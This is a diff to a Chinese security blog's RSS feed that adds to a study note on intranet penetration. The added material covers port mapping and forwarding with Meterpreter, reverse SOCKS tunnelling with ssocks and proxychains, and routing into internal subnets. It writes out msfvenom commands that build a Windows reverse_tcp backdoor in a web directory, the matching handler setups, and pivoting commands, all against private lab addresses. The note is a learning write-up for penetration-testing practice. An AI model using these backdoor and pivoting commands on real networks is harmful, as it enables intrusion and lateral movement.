@@ -7,12 +7,12 @@
         <language>zh-CN</language>
         <pubDate>Tue, 20 Jul 2021 21:40:34 +0800</pubDate>
         <lastBuildDate>Tue, 20 Jul 2021 21:40:34 +0800</lastBuildDate>
-        <category>数据库</category>
-        <category>免杀</category>
-        <category>渗透测试</category>
-        <category>web安全</category>
         <category>CTF</category>
         <category>靶场练习</category>
+        <category>web安全</category>
+        <category>免杀</category>
+        <category>渗透测试</category>
+        <category>数据库</category>
         <category>C++</category>
         <category>内网渗透</category>
         <category>代码审计</category>
@@ -21,8 +21,8 @@
             <guid isPermalink="true">https://ch1e.gitee.io/2021/07/20/neiwang/</guid>
             <title>内网渗透学习笔记</title>
             <link>https://ch1e.gitee.io/2021/07/20/neiwang/</link>
-            <category>渗透测试</category>
             <category>web安全</category>
+            <category>渗透测试</category>
             <category>内网渗透</category>
             <pubDate>Tue, 20 Jul 2021 21:40:34 +0800</pubDate>
             <description><![CDATA[ &lt;h2 id=&#34;隧道技术SSH隧道&#34;&gt;&lt;a href=&#34;#隧道技术SSH隧道&#34; class=&#34;headerlink&#34; title=&#34;隧道技术SSH隧道&#34;&gt;&lt;/a&gt;隧道技术SSH隧道&lt;/h2&gt;&lt;p&gt;ssh 用于登录远程主机, 并且在远程主机上执行命令. 它的目的是替换 rlogin 和 rsh, 同时在不安全的网络之上, 两个互不 信任的主机之间, 提供加密的, 安全的通信连接. X11 连接和任意 TCP/IP 端口均可以通过此安全通道转发(forward).当用户通过 连接并登录主机 hostname 后, 根据所用的协议版本, 用户必须通过下述方法之一向远程主机证明他/她的身份:&lt;/p&gt;
@@ -84,6 +84,73 @@
 
 &lt;p&gt;攻击机访问&lt;/p&gt;
 &lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;ssh –p 2222 web@127.0.0.1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+
+&lt;h2 id=&#34;端口转发与端口映射&#34;&gt;&lt;a href=&#34;#端口转发与端口映射&#34; class=&#34;headerlink&#34; title=&#34;端口转发与端口映射&#34;&gt;&lt;/a&gt;端口转发与端口映射&lt;/h2&gt;&lt;h3 id=&#34;端口映射&#34;&gt;&lt;a href=&#34;#端口映射&#34; class=&#34;headerlink&#34; title=&#34;端口映射&#34;&gt;&lt;/a&gt;端口映射&lt;/h3&gt;&lt;p&gt;端口映射：端口映射就是将内网中的主机的一个端口映射到外网主机的一个端口，提供相应的服务。当用户访问外网IP的这个端口时，服务器自动将请求映射到对应局域网内部的机器上。比如，我们在内网中有一台Web服务器，但是外网中的用户是没有办法直接访问该服务器的。于是我们可以在路由器上设置一个端口映射，只要外网用户访问路由器ip的80端口，那么路由器会把自动把流量转到内网Web服务器的80端口上。并且，在路由器上还存在一个Session，当内网服务器返回数据给路由器时，路由器能准确的将消息发送给外网请求用户的主机。在这过程中，路由器充当了一个反向代理的作用，他保护了内网中主机的安全&lt;/p&gt;
+&lt;p&gt;使用Metasploit先生成一个后门&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;msfvenom  -p windows/meterpreter/reverse_tcp lhost=本地主机ip  lport=本地主机端口 -f exe &amp;gt;/var/www/html/ss.exe&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+
+&lt;p&gt;使用Metasploit建立监听&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;msfconsole&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;use exploit/multi/handler&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;set payload windows/meterpreter/reverse_tcp&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;set lhost xxx.xxx.xxx.xxx&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;set lport xxxx&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;run&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+
+&lt;p&gt;映射端口&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;portfwd add -L 本地ip -l 本地端口 -p 目标端口 -r 目标ip&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+
+&lt;p&gt;Example：&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;portfwd add -L 192.168.0.115 -l 2020 -p 80 -r 10.10.10.128&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+
+&lt;p&gt;把10.10.10.128:80里的东西弄到192.168.0.115:2020上来，可以直接访问192.168.0.155:2020来获取10.10.10.128:2020的东西&lt;/p&gt;
+&lt;h3 id=&#34;端口转发&#34;&gt;&lt;a href=&#34;#端口转发&#34; class=&#34;headerlink&#34; title=&#34;端口转发&#34;&gt;&lt;/a&gt;端口转发&lt;/h3&gt;&lt;p&gt;端口转发：端口转发（Port forwarding），有时被叫做隧道，是安全壳（SSH） 为网络安全通信使用的一种方法。比如，我们现在在内网中，是没有办法直接访问外网的。但是我们可以通过路由器的NAT方式访问外网。假如我们内网现在有100台主机，那么我们现在都是通过路由器的这一个公网IP和外网通信的。那么，当互联网上的消息发送回来时，路由器是怎么知道这个消息是给他的，而另外消息是给你的呢？这就要我们的ip地址和路由器的端口进行绑定了，这时，在路由器中就会有一个内网ip和路由器端口对应的一张表。当路由器的10000端口收到消息时，就知道把消息发送给他，而当20000端口收到消息时，就知道把消息发送给你。这就是端口转发，其转发一个端口收到的流量，给另一个主机&lt;/p&gt;
+&lt;p&gt;端口转发&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;portfwd add -l 你本机的监听端口 -r 目标的ip地址 -p 3389&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+
+&lt;p&gt;是把目标机的3389端口转发到本机的端口&lt;/p&gt;
+&lt;p&gt;Example：&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;portfwd add -l 5555 -p 3389 -r 192.168.0.149&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;rdesktop 127.0.0.1: 5555&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+
+&lt;p&gt;把192.168.0.149:3389转发给本地5555端口，直接使用远程桌面连接连接本地5555端口就可以连接到目标机&lt;/p&gt;
+&lt;h3 id=&#34;端口转发和映射的区别&#34;&gt;&lt;a href=&#34;#端口转发和映射的区别&#34; class=&#34;headerlink&#34; title=&#34;端口转发和映射的区别&#34;&gt;&lt;/a&gt;端口转发和映射的区别&lt;/h3&gt;&lt;p&gt;​    端口转发：你给我了，我打开看看，发现这上面标志显示是要给张三，那么我就给张三去。如果标志是给李四，那我就再给李四去。&lt;/p&gt;
+&lt;p&gt;　端口映射：你放到我左手，我就直接给张三；你放到我右手，我就直接给李四。这中间我不管你放我手上的是什么东西。&lt;/p&gt;
+&lt;p&gt;　转发的重点在“转”上面。送快递的过来，把所有快递都交给门口保安，保安再根据每件快递上的收件人来分发。映射，就是在大门口给每个人装个柜子，送快递的直接按收件人名字，把快递放到对应的柜子里面&lt;/p&gt;
+&lt;p&gt;以上部分内容转自谢公子，原文链接：&lt;a href=&#34;https://blog.csdn.net/qq_36119192/article/details/84539150&#34;&gt;https://blog.csdn.net/qq_36119192/article/details/84539150&lt;/a&gt;&lt;/p&gt;
+&lt;h2 id=&#34;隧道技术-socket隧道&#34;&gt;&lt;a href=&#34;#隧道技术-socket隧道&#34; class=&#34;headerlink&#34; title=&#34;隧道技术-socket隧道&#34;&gt;&lt;/a&gt;隧道技术-socket隧道&lt;/h2&gt;&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/ZwqGG/image@main/img/image-20210724085325540.png&#34; alt=&#34;image-20210724085325540&#34;&gt;&lt;/p&gt;
+&lt;p&gt;本机通过web服务器访问数据服务器，要打开一个socket隧道&lt;/p&gt;
+&lt;p&gt;实际上是反向连接，web服务器连接到本地&lt;/p&gt;
+&lt;p&gt;sscoks工具下载地址：&lt;a href=&#34;https://sourceforge.net/projects/ssocks/&#34;&gt;https://sourceforge.net/projects/ssocks/&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;首先需要把工具先进行编译，把压缩包下载下来&lt;/p&gt;
+&lt;p&gt; tar -zxvf   xxx.tar.gz   然后进入到压缩出来的文件夹&lt;/p&gt;
+&lt;p&gt;./configure &amp;amp;&amp;amp; make&lt;/p&gt;
+&lt;p&gt;在本机输入&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;./rcsocks -l 1088 -p 1080 -vv  &lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+
+&lt;p&gt;这里的1088是本地开放的要被连接的端口，1080是web服务器端发起连接的端口&lt;/p&gt;
+&lt;p&gt;等待远程Socks5服务器访问本地1080端口，创建端口1080与本地端口1088的连接通道&lt;/p&gt;
+&lt;p&gt;在web服务器端输入&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;./rssocks  -vv -s   ip:port&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+
+&lt;p&gt;这里的端口是本机的ip，port是开放的端口&lt;/p&gt;
+&lt;p&gt;然后利用proxychains进行Socks5代理&lt;/p&gt;
+&lt;p&gt;安装proxychains&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;apt-get install proxychains&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+
+&lt;p&gt;修改/etc/proxychains.conf &lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;把最后一行改成socks5  ip:port&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+
+&lt;h2 id=&#34;跨路由扫描&#34;&gt;&lt;a href=&#34;#跨路由扫描&#34; class=&#34;headerlink&#34; title=&#34;跨路由扫描&#34;&gt;&lt;/a&gt;跨路由扫描&lt;/h2&gt;&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/ZwqGG/image@main/img/image-20210724092854045.png&#34; alt=&#34;image-20210724092854045&#34;&gt;&lt;/p&gt;
+&lt;p&gt;生成metasploit后门&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;msfvenom  -p windows/meterpreter/reverse_tcp lhost=192.168.0.196  lport=12345 -f exe &amp;gt;/var/www/html/s.exe&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+
+&lt;p&gt;kali监听&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;use exploit/multi/handler&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;set payload  windows/meterpreter/reverse_tcp&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;set lhost 192.168.0.196&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;set lport 12345&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;exploit&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+
+&lt;p&gt;查看当前用户&lt;/p&gt;
+&lt;p&gt;getuid&lt;/p&gt;
+&lt;p&gt;获取网卡信息&lt;/p&gt;
+&lt;p&gt;ifconfig&lt;/p&gt;
+&lt;p&gt;路由信息&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;run get_local_subnets&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+
+&lt;p&gt;增加路由&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;run autoroute  -s 10.10.10.0/24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;run autoroute –p&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
 
  ]]></description>
         </item>
